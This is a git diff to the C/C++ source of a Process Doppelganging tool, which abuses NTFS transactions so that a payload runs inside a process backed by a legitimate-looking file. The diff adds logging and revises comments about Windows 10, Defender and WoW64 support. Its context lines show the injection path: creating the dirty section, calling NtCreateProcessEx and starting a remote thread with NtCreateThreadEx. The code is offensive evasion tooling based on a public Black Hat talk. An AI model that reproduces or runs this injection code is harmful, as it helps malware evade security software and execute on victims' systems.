@@ -1,7 +1,8 @@
 /**
 * Process Doppelganging - Inject code into a process by creating a malicious section that is backed by a legit file by abusing NTFS transactions.
 * Supports 32- and 64 Bit applications. The 64 bit implementation currently does not support copying the environment in the remote process.
-* No support for Windows 7 or WoW64
+* No support for Windows 10 since a Windows Defender drivers prevents the thread from executing even with Windows Defender disabled.
+* No support for WoW64. Technically possible but using low level API with WoW64 is complicated. One has for example to deal with 2 PEBs.
 * Based on: https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf
 */
 
@@ -281,15 +282,17 @@ int8_t* ReadEntryPointOfRemoteProcess(HANDLE processHandle, PROCESS_BASIC_INFORM
 bool Doppelgang(char* targetPath, int8_t* payloadBuffer, DWORD payloadSize)
 {
 	// create a dirty section of a file that is clean on disc
-	HANDLE dirtySection = CreateDirtySectionOfCleanFile(payloadBuffer, payloadSize);
-	if (!dirtySection)
+	HANDLE dirtySectionHandle = CreateDirtySectionOfCleanFile(payloadBuffer, payloadSize);
+	if (!dirtySectionHandle)
 	{
 		return false;
 	}
 
+	printf("[Info] - Created dirty section with handle %p\n", dirtySectionHandle);
+
 	// create a process using the dirty section
 	HANDLE processHandle = nullptr;
-	if (!NT_SUCCESS(NtCreateProcessEx(&processHandle, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, dirtySection, NULL, NULL, FALSE)))
+	if (!NT_SUCCESS(NtCreateProcessEx(&processHandle, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, dirtySectionHandle, NULL, NULL, FALSE)))
 	{
 		printf("[Error] - Failed to NtCreateProcessEx using dirty section");
 		return false;
@@ -310,6 +313,8 @@ bool Doppelgang(char* targetPath, int8_t* payloadBuffer, DWORD payloadSize)
 		return false;
 	}
 
+	printf("[Info] - Read entry point of remote of remote process %p\n", remoteEntryPoint);
+
 	if (!SetupProcessParameters(processHandle, processBasicInformation, targetPath))
 	{
 		printf("[Error] - Failed to SetupProcessParameters\n");
@@ -322,6 +327,8 @@ bool Doppelgang(char* targetPath, int8_t* payloadBuffer, DWORD payloadSize)
 		printf("[Error] - Failed to NtCreateThreadEx\n");
 		return false;
 	}
+
+	printf("[Info] - Created thread executing %p\n", remoteEntryPoint);
 	return true;
 }
 
@@ -366,7 +373,7 @@ int main(int argc, char* argv[])
 		return 1;
 	}
 
-	// frees entire page allocated by VirtualAlloc
+	// cleanup
 	VirtualFree(payloadBuffer, 0, MEM_RELEASE);
 	return 0;
 }
